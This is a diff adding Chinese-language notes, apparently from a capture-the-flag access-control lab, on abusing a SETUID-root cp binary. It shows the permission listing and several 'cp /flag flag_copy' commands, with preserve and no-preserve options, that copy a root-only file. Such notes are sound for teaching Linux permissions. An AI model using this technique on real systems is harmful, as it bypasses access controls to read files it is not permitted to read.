@@ -1,0 +1,21 @@
+所有类型的文件命令程序本身都可以被设置SETUID，可以使用ls -la /name , ls -ld /name，去查看文件权限信息
+    hacker@access-control~level5:~/Desktop$ ls -l /bin/cp
+    -rwsr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp
+      --文件显示被设置了SETUID，并且所有用户都被设有执行权限，
+      --通过阅读显示此命令为copy命令，可以通过此命令复制文件，但是由于SETUID的存在，可以复制任何文件，包括root文件
+    cp--
+       cp /flag flag_copy
+          --将flag文件复制到flag_copy文件中，但是这种不带任何前提的复制会将源文件的权限信息一同复制到新的文件
+        cp -p /flag flag_copy
+          --通过-p参数可以保留源文件的权限信息
+        cp --no-preserve=mode,ownership /flag flag_copy
+            --通过--no-preserve=mode,ownership参数可以不保留源文件的权限信息
+               --no-preserve=mode,ownership
+                  --其中可以设置多种mode，ownership，timestamps，links，xattr，all
+                    --mode：不保留文件权限
+                    --ownership：不保留文件所有者
+                    --timestamps：不保留文件时间戳
+                    --links：不保留文件链接
+                    --xattr：不保留文件扩展属性
+                    --all：不保留所有文件信息
+    
